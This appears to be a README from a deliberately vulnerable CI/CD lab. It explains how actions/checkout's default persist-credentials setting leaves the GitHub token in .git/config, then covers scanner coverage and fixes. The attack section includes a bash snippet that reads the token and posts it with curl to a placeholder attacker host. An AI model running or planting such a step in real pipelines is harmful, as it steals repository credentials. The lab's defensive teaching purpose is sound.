# Scenario 12: `actions/checkout` leaves the token in `.git/config`

**OWASP CICD-SEC mapping:** CICD-SEC-6 (Insufficient Credential Hygiene),
CICD-SEC-3 (Dependency Chain Abuse)

**Vulnerable workflow:** [`.github/workflows/scenario-12-persist-credentials-leak.yml`](../../.github/workflows/scenario-12-persist-credentials-leak.yml)

## The pattern

`actions/checkout` defaults `persist-credentials: true`. After checkout,
`.git/config` on the runner contains something like:

```
[http "https://github.com/"]
    extraheader = AUTHORIZATION: basic <base64(x-access-token:<GITHUB_TOKEN>)>
```

The token sits there for the rest of the job. Any subsequent step — your
own scripts, third-party actions, build tools that read git config — can
read it.

Combine with [Scenario 03 (mutable action ref)](../03-action-mutable-ref/README.md)
and the picture is grim: a compromised third-party action doesn't need to
exfiltrate via process memory; it just reads `.git/config`.

## How an attacker exploits it

1. Compromise (or maintain) any third-party action used later in the job.
2. Inside that action, do:
   ```bash
   token=$(grep AUTHORIZATION .git/config | base64 -d | cut -d: -f3-)
   curl -d "$token" attacker.tld
   ```
3. The token has whatever scopes `permissions:` granted — Scenario 04
   (write-all) makes this a full repo takeover.

## Expected scanner coverage

| Scanner   | Detection |
|-----------|-----------|
| zizmor    | `artipacked` (persist-credentials true) |
| poutine   | partial |
| checkov   | partial |
| kics      | partial |
| trivy     | limited |
| gitleaks  | n/a (token isn't in source) |

## Fix

Set `persist-credentials: false` whenever the job doesn't need to push
back to the repo:

```yaml
- uses: actions/checkout@v4
  with:
    persist-credentials: false
```

If you do need to push, do the push from a dedicated job and revoke the
extraheader as the last step:

```yaml
- run: git config --unset-all http.https://github.com/.extraheader
```

## References

- zizmor — `artipacked` audit:
  https://docs.zizmor.sh/audits/#artipacked
- actions/checkout docs — `persist-credentials`:
  https://github.com/actions/checkout#usage
